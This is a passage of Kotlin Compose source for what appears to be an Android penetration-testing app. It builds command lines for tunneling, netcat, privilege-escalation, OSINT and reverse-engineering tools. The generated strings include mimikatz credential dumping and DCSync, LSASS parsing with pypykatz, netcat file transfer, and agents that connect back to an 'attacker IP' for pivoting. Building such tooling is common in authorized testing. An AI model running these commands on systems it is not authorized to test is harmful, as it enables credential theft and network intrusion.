                        modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { tunnelType = t }.padding(vertical = 6.dp),
                        contentAlignment = Alignment.Center
                    ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
                }
            }
            if (tunnelType == "forward") {
                Spacer(modifier = Modifier.height(8.dp))
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    OutlinedTextField(value = localPort, onValueChange = { localPort = it }, label = { Text("Yerel Dinleme Portu") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
                    OutlinedTextField(value = remoteHost, onValueChange = { remoteHost = it }, label = { Text("Hedef Host IP") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
                    OutlinedTextField(value = remotePort, onValueChange = { remotePort = it }, label = { Text("Hedef Port") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
                }
            }
        }

        val cmd = if (mode == "server") {
            "chisel server -p $port" + (if (reverse) " --reverse" else "") + (if (socks5) " --socks5" else "") + " -v"
        } else {
            if (tunnelType == "socks") "chisel client $serverHost R:socks"
            else "chisel client $serverHost R:$localPort:$remoteHost:$remotePort"
        }

        GeneratedCommandCard(command = cmd, language = language)
    }
}

// 41. LIGOLO-NG
@Composable
fun LigoloBuilder(language: AppLanguage) {
    var step by remember { mutableStateOf("1_tun") }
    var port by remember { mutableStateOf("11601") }
    var targetSubnet by remember { mutableStateOf("172.16.1.0/24") }
    var attackerIp by remember { mutableStateOf("10.10.14.5") }

    Column {
        Text(text = "LIGOLO-NG ADIMLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(
                "1_tun" to "1. TUN Oluştur",
                "2_proxy" to "2. Proxy Başlat",
                "3_route" to "3. Rota Ekle",
                "4_agent" to "4. Agent Bağla"
            ).forEach { (s, lbl) ->
                val sel = step == s
                Box(
                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { step = s }.padding(horizontal = 8.dp, vertical = 6.dp)
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        when (step) {
            "2_proxy" -> {
                OutlinedTextField(value = port, onValueChange = { port = it }, label = { Text("Proxy Dinleme Portu") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            }
            "3_route" -> {
                OutlinedTextField(value = targetSubnet, onValueChange = { targetSubnet = it }, label = { Text("Tünellenecek Alt Ağ (CIDR)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            }
            "4_agent" -> {
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    OutlinedTextField(value = attackerIp, onValueChange = { attackerIp = it }, label = { Text("Saldırgan IP") }, modifier = Modifier.weight(2f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
                    OutlinedTextField(value = port, onValueChange = { port = it }, label = { Text("Port") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
                }
            }
        }

        val cmd = when (step) {
            "1_tun" -> "sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up"
            "2_proxy" -> "./proxy -selfcert -laddr 0.0.0.0:$port"
            "3_route" -> "sudo ip route add $targetSubnet dev ligolo"
            "4_agent" -> "./agent -connect $attackerIp:$port -ignore-cert"
            else -> ""
        }

        GeneratedCommandCard(command = cmd, language = language)
    }
}

// 42. NETCAT (NC)
@Composable
fun NetcatBuilder(language: AppLanguage) {
    var mode by remember { mutableStateOf("listen") }
    var host by remember { mutableStateOf("10.10.10.100") }
    var port by remember { mutableStateOf("4444") }
    var fileName by remember { mutableStateOf("transfer.bin") }

    Column {
        Text(text = "KULLANIM MODU", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(
                "listen" to "Port Dinle",
                "connect" to "Bağlantı Kur",
                "recv" to "Dosya Al",
                "send" to "Dosya Gönder",
                "banner" to "Banner Yakala"
            ).forEach { (m, lbl) ->
                val sel = mode == m
                Box(
                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { mode = m }.padding(horizontal = 8.dp, vertical = 6.dp)
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            if (mode != "listen" && mode != "recv") {
                OutlinedTextField(value = host, onValueChange = { host = it }, label = { Text("Hedef IP") }, modifier = Modifier.weight(2f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            }
            OutlinedTextField(value = port, onValueChange = { port = it }, label = { Text("Port") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        if (mode == "recv" || mode == "send") {
            Spacer(modifier = Modifier.height(8.dp))
            OutlinedTextField(value = fileName, onValueChange = { fileName = it }, label = { Text("Dosya Adı") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }

        val cmd = when (mode) {
            "listen" -> "nc -lvnp $port"
            "connect" -> "nc -nv $host $port"
            "recv" -> "nc -lvnp $port > $fileName"
            "send" -> "nc -nv $host $port < $fileName"
            "banner" -> "echo \"\" | nc -nv -w 2 $host $port"
            else -> ""
        }

        GeneratedCommandCard(command = cmd, language = language)
    }
}

// 43. PROXYCHAINS
@Composable
fun ProxychainsBuilder(language: AppLanguage) {
    var cmdToRun by remember { mutableStateOf("nmap -sT -Pn -p 80,445 10.10.10.100") }
    var quiet by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = cmdToRun, onValueChange = { cmdToRun = it }, label = { Text("Proxy Üzerinden Çalıştırılacak Komut") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-q Sessiz Mod (Proxychains loglarını gizle)", checked = quiet, onCheckedChange = { quiet = it })

        val cmd = if (quiet) "proxychains4 -q $cmdToRun" else "proxychains4 $cmdToRun"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

// 44. SSHUTTLE
@Composable
fun SshuttleBuilder(language: AppLanguage) {
    var sshServer by remember { mutableStateOf("user@10.10.10.100") }
    var subnet by remember { mutableStateOf("172.16.1.0/24") }
    var dnsForward by remember { mutableStateOf(true) }
    var sshKey by remember { mutableStateOf("") }

    Column {
        OutlinedTextField(value = sshServer, onValueChange = { sshServer = it }, label = { Text("SSH Sunucu Adresi (kullanıcı@ip)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = subnet, onValueChange = { subnet = it }, label = { Text("Tünellenecek Alt Ağ (CIDR: 172.16.1.0/24)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--dns DNS Sorgularını da Tünelle", checked = dnsForward, onCheckedChange = { dnsForward = it })

        val parts = mutableListOf("sshuttle", "-r", sshServer, subnet)
        if (dnsForward) parts.add("--dns")
        if (sshKey.isNotBlank()) parts.addAll(listOf("-e", "'ssh -i $sshKey'"))

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// -------------------------------------------------------------
// 7. PRIVESC & MEMORY BUILDERS
// -------------------------------------------------------------

// 45. PEASS-NG
@Composable
fun PeassNgBuilder(language: AppLanguage) {
    var targetOs by remember { mutableStateOf("linux") }
    var quickMode by remember { mutableStateOf(true) }
    var thorough by remember { mutableStateOf(false) }
    var secretSearch by remember { mutableStateOf(false) }
    var teeOutput by remember { mutableStateOf(true) }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("linux" to "Linux (linPEAS)", "windows" to "Windows (winPEAS)").forEach { (os, lbl) ->
                val sel = targetOs == os
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { targetOs = os }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(6.dp))
        if (targetOs == "linux") {
            ToggleOption(label = "-q Sessiz Mod", checked = quickMode, onCheckedChange = { quickMode = it })
            ToggleOption(label = "-a Kapsamlı Tüm Testler (Uzun sürer)", checked = thorough, onCheckedChange = { thorough = it })
            ToggleOption(label = "-s Parola ve Anahtar Arama Modülü", checked = secretSearch, onCheckedChange = { secretSearch = it })
            ToggleOption(label = "| tee linpeas.txt Çıktıyı Dosyaya Yaz", checked = teeOutput, onCheckedChange = { teeOutput = it })
        }

        val cmd = if (targetOs == "linux") {
            val flags = mutableListOf<String>()
            if (quickMode) flags.add("-q")
            if (thorough) flags.add("-a")
            if (secretSearch) flags.add("-s")
            "./linpeas.sh " + flags.joinToString(" ") + if (teeOutput) " | tee linpeas.txt" else ""
        } else {
            "winpeas.exe quiet cmd systeminfo"
        }

        GeneratedCommandCard(command = cmd.trim(), language = language)
    }
}

// 46. MIMIKATZ
@Composable
fun MimikatzBuilder(language: AppLanguage) {
    var action by remember { mutableStateOf("logonpasswords") }
    var domain by remember { mutableStateOf("corp.local") }
    var user by remember { mutableStateOf("Administrator") }

    Column {
        Text(text = "MIMIKATZ KOMUT MODÜLLERİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(
                "logonpasswords" to "LSASS Parola & Hash",
                "sam" to "SAM Hashes",
                "tickets" to "Kerberos Bilet Dökümü",
                "dcsync" to "DCSync Saldırısı"
            ).forEach { (act, lbl) ->
                val sel = action == act
                Box(
                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { action = act }.padding(horizontal = 8.dp, vertical = 6.dp)
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        if (action == "dcsync") {
            Spacer(modifier = Modifier.height(8.dp))
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                OutlinedTextField(value = domain, onValueChange = { domain = it }, label = { Text("Domain Adı") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
                OutlinedTextField(value = user, onValueChange = { user = it }, label = { Text("Kullanıcı") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            }
        }

        val cmd = when (action) {
            "logonpasswords" -> "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""
            "sam" -> "mimikatz.exe \"privilege::debug\" \"lsadump::sam\" \"exit\""
            "tickets" -> "mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" \"exit\""
            "dcsync" -> "mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:$domain /user:$user\" \"exit\""
            else -> ""
        }

        GeneratedCommandCard(command = cmd, language = language)
    }
}

// 47. PYPYKATZ
@Composable
fun PypykatzBuilder(language: AppLanguage) {
    var mode by remember { mutableStateOf("minidump") }
    var dumpFile by remember { mutableStateOf("lsass.dmp") }
    var saveJson by remember { mutableStateOf(true) }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("minidump" to "Döküm Dosyası (minidump)", "live" to "Canlı Sistem (live lsa)").forEach { (m, lbl) ->
                val sel = mode == m
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { mode = m }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        if (mode == "minidump") {
            Spacer(modifier = Modifier.height(8.dp))
            OutlinedTextField(value = dumpFile, onValueChange = { dumpFile = it }, label = { Text("LSASS Minidump Dosya Yolu") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--json Çıktıyı JSON Olarak Kaydet", checked = saveJson, onCheckedChange = { saveJson = it })

        val cmd = if (mode == "minidump") {
            "pypykatz minidump $dumpFile" + if (saveJson) " --json" else ""
        } else {
            "pypykatz live lsa" + if (saveJson) " --json" else ""
        }

        GeneratedCommandCard(command = cmd, language = language)
    }
}

// -------------------------------------------------------------
// 8. OSINT & RECON BUILDERS
// -------------------------------------------------------------

// 48. THEHARVESTER
@Composable
fun TheHarvesterBuilder(language: AppLanguage) {
    var domain by remember { mutableStateOf("example.com") }
    var sources by remember { mutableStateOf("all") }
    var limit by remember { mutableStateOf("500") }
    var saveOutput by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = domain, onValueChange = { domain = it }, label = { Text("Hedef Domain (-d)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = sources, onValueChange = { sources = it }, label = { Text("Kaynaklar (-b: all, google, shodan)") }, modifier = Modifier.weight(2f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = limit, onValueChange = { limit = it }, label = { Text("Limit (-l)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-f harvest_report.html Rapor Dosyası", checked = saveOutput, onCheckedChange = { saveOutput = it })

        val parts = mutableListOf("theHarvester", "-d", domain, "-b", sources, "-l", limit)
        if (saveOutput) parts.addAll(listOf("-f", "harvest_report.html"))

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 49. SHERLOCK
@Composable
fun SherlockBuilder(language: AppLanguage) {
    var username by remember { mutableStateOf("target_user") }
    var timeout by remember { mutableStateOf("10") }
    var printFoundOnly by remember { mutableStateOf(true) }
    var saveOutput by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = username, onValueChange = { username = it }, label = { Text("Aranacak Kullanıcı Adı") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--print-found Yalnızca Bulunan Hesapları Göster", checked = printFoundOnly, onCheckedChange = { printFoundOnly = it })
        ToggleOption(label = "--folderoutput results/ Klasöre Kaydet", checked = saveOutput, onCheckedChange = { saveOutput = it })

        val parts = mutableListOf("sherlock", username, "--timeout", timeout)
        if (printFoundOnly) parts.add("--print-found")
        if (saveOutput) parts.addAll(listOf("--folderoutput", "results/"))

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 50. GITLEAKS
@Composable
fun GitleaksBuilder(language: AppLanguage) {
    var sourcePath by remember { mutableStateOf(".") }
    var verbose by remember { mutableStateOf(true) }
    var redact by remember { mutableStateOf(true) }
    var saveReport by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = sourcePath, onValueChange = { sourcePath = it }, label = { Text("Git Repo / Klasör Yolu (--source)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-v Detaylı Bulgu Raporu", checked = verbose, onCheckedChange = { verbose = it })
        ToggleOption(label = "--redact Hassas Anahtarları Loglarda Maskele", checked = redact, onCheckedChange = { redact = it })
        ToggleOption(label = "--report-path gitleaks_report.json JSON Rapor", checked = saveReport, onCheckedChange = { saveReport = it })

        val parts = mutableListOf("gitleaks", "detect", "--source", sourcePath)
        if (verbose) parts.add("-v")
        if (redact) parts.add("--redact")
        if (saveReport) parts.addAll(listOf("--report-path", "gitleaks_report.json"))

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 51. TRUFFLEHOG
@Composable
fun TruffleHogBuilder(language: AppLanguage) {
    var targetType by remember { mutableStateOf("git") }
    var target by remember { mutableStateOf("https://github.com/organization/repo") }
    var onlyVerified by remember { mutableStateOf(true) }
    var jsonOutput by remember { mutableStateOf(false) }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("git" to "Git Repo", "filesystem" to "Yerel Dizin", "s3" to "AWS S3").forEach { (t, lbl) ->
                val sel = targetType == t
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { targetType = t }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = target, onValueChange = { target = it }, label = { Text(if (targetType == "git") "Git Repo URL" else "Hedef Yol") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--only-verified Yalnızca Doğrulanmış Çalışan Anahtarları Listele", checked = onlyVerified, onCheckedChange = { onlyVerified = it })
        ToggleOption(label = "--json JSON Çıktısı", checked = jsonOutput, onCheckedChange = { jsonOutput = it })

        val parts = mutableListOf("trufflehog", targetType, target)
        if (onlyVerified) parts.add("--only-verified")
        if (jsonOutput) parts.add("--json")

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// -------------------------------------------------------------
// 9. REVERSE & FORENSICS & EXPLOITATION BUILDERS
// -------------------------------------------------------------

// 52. SEARCHSPLOIT
@Composable
fun SearchsploitBuilder(language: AppLanguage) {
    var query by remember { mutableStateOf("Apache 2.4.49") }
    var edbId by remember { mutableStateOf("50383") }
    var action by remember { mutableStateOf("search") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("search" to "Ara", "web" to "Linkler (-w)", "mirror" to "Kopyala (-m)", "examine" to "İncele (-x)").forEach { (act, lbl) ->
                val sel = action == act
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { action = act }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        if (action == "search" || action == "web") {
            OutlinedTextField(value = query, onValueChange = { query = it }, label = { Text("Arama Terimi (örn: Windows SMB, OpenSSH)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        } else {
            OutlinedTextField(value = edbId, onValueChange = { edbId = it }, label = { Text("EDB-ID Numarası (örn: 50383)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }

        val cmd = when (action) {
            "search" -> "searchsploit $query"
            "web" -> "searchsploit -w $query"
            "mirror" -> "searchsploit -m $edbId"
            "examine" -> "searchsploit -x $edbId"
            else -> ""
        }

        GeneratedCommandCard(command = cmd, language = language)
    }
}

// 53. CHECKSEC
@Composable
fun ChecksecBuilder(language: AppLanguage) {
    var mode by remember { mutableStateOf("file") }
    var targetPath by remember { mutableStateOf("./vuln_binary") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("file" to "Tek Dosya (--file)", "dir" to "Dizin (--dir)").forEach { (m, lbl) ->
                val sel = mode == m
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { mode = m }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = targetPath, onValueChange = { targetPath = it }, label = { Text("Hedef İkili Dosya / Dizin") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)

        val cmd = if (mode == "file") "checksec --file=$targetPath" else "checksec --dir=$targetPath"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

// 54. RADARE2 (RABIN2)
@Composable
fun Rabin2Builder(language: AppLanguage) {
    var binaryPath by remember { mutableStateOf("/bin/ls") }
    var action by remember { mutableStateOf("-I") }

    Column {
        Text(text = "RABIN2 ANALİZ BİLEŞENİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(
                "-I" to "İkili Bilgisi (-I)",
                "-z" to "Stringler (-z)",
                "-i" to "İmportlar (-i)",
                "-E" to "Exportlar (-E)",
                "-S" to "Section Tablosu (-S)"
            ).forEach { (act, lbl) ->
                val sel = action == act
                Box(
                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { action = act }.padding(horizontal = 8.dp, vertical = 6.dp)
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = binaryPath, onValueChange = { binaryPath = it }, label = { Text("İkili Dosya Yolu (Binary Path)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)

        val cmd = "rabin2 $action $binaryPath"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

// 55. BINWALK
@Composable
fun BinwalkBuilder(language: AppLanguage) {
    var filePath by remember { mutableStateOf("firmware.bin") }
    var extract by remember { mutableStateOf(true) }
    var matryoshka by remember { mutableStateOf(true) }
    var entropy by remember { mutableStateOf(false) }

    Column {
        OutlinedTextField(value = filePath, onValueChange = { filePath = it }, label = { Text("Firmware / Dosya Yolu") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-e Tanımlanan Dosya Sistemlerini Otomatik Çıkar", checked = extract, onCheckedChange = { extract = it })
        ToggleOption(label = "-M Özyinelemeli Çıkarım Yap (Matryoshka)", checked = matryoshka, onCheckedChange = { matryoshka = it })
        ToggleOption(label = "-E Entropi Grafiği Hesapla (Şifrelenmiş bölümler)", checked = entropy, onCheckedChange = { entropy = it })

        val parts = mutableListOf("binwalk")
        if (extract) parts.add("-e")
        if (matryoshka) parts.add("-M")
        if (entropy) parts.add("-E")
        parts.add(filePath)

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 56. EXIFTOOL
@Composable
fun ExifToolBuilder(language: AppLanguage) {
    var filePath by remember { mutableStateOf("sample.jpg") }
    var action by remember { mutableStateOf("view") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("view" to "Üstveri Oku", "strip" to "Tüm Meta Verileri Sil (-all=)", "json" to "JSON Çıkar (-j)").forEach { (act, lbl) ->
                val sel = action == act
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { action = act }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
